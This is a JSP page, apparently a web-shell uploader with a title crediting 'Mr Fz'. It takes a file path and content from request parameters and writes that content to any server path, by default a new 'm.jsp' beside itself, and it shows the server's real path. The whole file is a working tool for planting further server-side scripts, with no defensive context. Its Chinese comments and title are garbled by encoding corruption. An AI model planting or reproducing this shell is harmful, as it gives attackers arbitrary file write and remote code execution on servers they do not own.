<%@ page language="java" pageEncoding="UTF-8"%>
<%@ page contentType="text/html;charset=UTF-8"%>
<%@ page import="java.io.*"%>
<html>
<head>
<title>jsp�0�2��0�5���0�8�0�1 | Mr Fz's�0�1�0�0�0�9�0�1�0�2�0�2�0�1�0�0�0�9�0�4�0�9�0�8!�0�1�0�0�0�6�0�4�0�7�0�1�0�4�0�0���0�1�0�2�0�4�0�2�0�1�0�6�0�1�0�0�0�6�0�4�0�7�0�3�0�4�0�6�0�4!</title>
</head>
<body bgcolor="#ffffff">
<%
String damapath=request.getParameter("path");
String content=request.getParameter("content");
String url=request.getRequestURI();//�0�2�0�5�0�9�0�2�0�9�0�3���0�3�0�8���0�9�0�4 
String url1=request.getRealPath(request.getServletPath());//�0�2�0�5�0�9�0�2�0�9�0�3�0�3���0�2���0�4���0�4�0�6�0�4JSP�0�3�0�2�0�7�0�1�0�3�0�9�0�4�0�6�0�4�0�4�0�9�0�8�0�4�0�6�0�6�����0�4�0�2�0�6�0�4
String dir=new File(url1).getParent(); //�0�2�0�5�0�9�0�2�0�9�0�3JSP�0�3�0�2�0�7�0�1�0�3�0�9�0�3�0�9�0�0�0�2�0�8���0�4�0�7�0�3�0�2�0�5�0�1�0�4�0�6�0�4�0�4�0�9�0�8�0�4�0�6�0�6�����0�4�0�2�0�6�0�4
if(damapath!=null &&!damapath.equals("")&&content!=null&&!content.equals(""))
{
try{
File damafile=new File(damapath);//�0�4�0�0��file�0�4���0�3�0�2�0�8�0�7�0�2�0�3�0�2�0�1�0�0�0�0�0�1�0�0�0�9damafile�0�2�0�4�0�1�����0�3�0�2�0�1�0�9�0�3�0�2�0�7�0�2�0�3�0�6�0�2�0�3�0�3�0�4�0�6�0�4�����0�4�0�2�0�6�0�4damapath
PrintWriter   pw=new PrintWriter(damafile);//�0�1�0�5�0�7�0�4�0�0���0�3�0�2�0�7�0�2�0�3�0�6�0�3�0�2�0�7�0�1�0�3�0�9damafile�0�2�0�8�0�7�0�2�0�3�0�2printwriter
pw.println(content);//�0�3�0�9�0�9�0�2�0�3��content,�0�2�0�1�0�9�0�4�0�3�0�8�0�3�0�2�0�4�0�3�0�9�0�9�0�2�0�3��
pw.close();//�0�2�0�5�0�6���0�3�0�2�0�3�0�8�0�1���0�7�0�0�0�3�0�0�0�6���0�8�0�4�0�3�0�2�0�6
if(damafile.exists()&& damafile.length()>0)//�0�2�0�8��0�3�0�2�0�2damafile�0�2�0�4�0�1�����0�3�0�3�0�4�0�4�0�2�0�6�0�7�0�2�0�2�0�4�0�2�0�8��,
{
   out.println("<font size=3 color=red>save ok!</font>");
}else
{
   out.println("<font size=3 color=red>save bad!</font>");
}
}catch (Exception ex){
   ex.printStackTrace();
}
}
out.println("<form action="+url+" method=post>");
out.println("<font size=2>���0�4�����0�6�0�9�0�2�0�5�0�6�0�1�0�7�0�9�0�2�0�2�0�4�����0�4�0�2�0�6�0�4:</font><input type=text size=45 name=path value="+dir+"/m.jsp><br>");
out.println("<font size=2 color=red>�0�2�0�5�0�9�0�2�0�9�0�3�0�1�0�5�0�2�0�3���0�2���0�4���0�4�0�6�0�4JSP�0�3�0�2�0�7�0�1�0�3�0�9�0�4�0�6�0�4�0�4�0�9�0�8�0�4�0�6�0�6�����0�4�0�2�0�6�0�4:"+url1+"</font><br>");
out.println("<textarea name=content rows=10 cols=50></textarea><br>");
out.println("<input type=submit value=save>");
out.println("</form>");
%>
</body>
</html>
